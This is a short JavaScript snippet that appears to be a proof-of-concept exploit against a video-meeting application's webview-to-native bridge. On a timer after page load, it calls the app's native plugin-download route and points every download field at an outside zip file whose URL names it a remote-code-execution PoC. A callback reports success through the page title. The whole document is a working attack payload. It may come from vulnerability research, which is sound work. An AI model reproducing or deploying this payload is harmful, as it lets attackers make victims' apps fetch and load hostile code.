(function(){
  document.title='P112PAY';
  window.__p112=function(r){document.title='P112CB:'+r};
  var u='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  setTimeout(function(){
    JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p112',module:'CommonPlugin',method:'OpenNewPage',callId:'P112-DL',
      param:{scheme:'wemeet://page/premeeting/schedule_plugin_download',router_params:{
        url:u,download_url:u,plugin_url:u,package_url:u,resource_url:u,
        md5:'1fcb47a1646f6b2c77c4fda65e332eee',plugin_md5:'1fcb47a1646f6b2c77c4fda65e332eee',
        plugin_id:'p112',module_name:'p112',package_name:'p112',from_webView:true
      }}
    }));
  },700);
})();
